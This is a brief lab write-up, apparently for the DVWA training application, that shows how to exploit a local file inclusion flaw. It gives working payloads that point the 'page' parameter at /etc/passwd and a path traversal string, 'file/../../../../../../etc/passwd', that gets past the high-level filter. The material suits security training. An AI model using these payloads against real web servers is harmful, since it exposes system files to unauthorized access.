# File Inclusion

**Security level is currently: low.**

In url there is GET parameter `page` used for including file.

url:`http://192.168.170.131/vulnerabilities/fi/?page=include.php`

By changing this file location we can read file on server.

url:`http://192.168.170.131/vulnerabilities/fi/?page=/etc/passwd`

<img width="658" alt="image" src="https://user-images.githubusercontent.com/79740895/185410392-bf62fdae-c6c7-4f90-a934-191ffadcf471.png">


_Also work for medium_

**Security level is currently: high.**

we have one condition that file name should start with `file`.

<img width="343" alt="image" src="https://user-images.githubusercontent.com/79740895/185414371-f1a0cb44-0688-40ab-ae49-1c623e19744f.png">

we can bypass that with payload:`file/../../../../../../etc/passwd` path traversal.

<img width="456" alt="image" src="https://user-images.githubusercontent.com/79740895/185414731-fda51955-9d13-4b60-893a-f700f29021eb.png">

<br/>
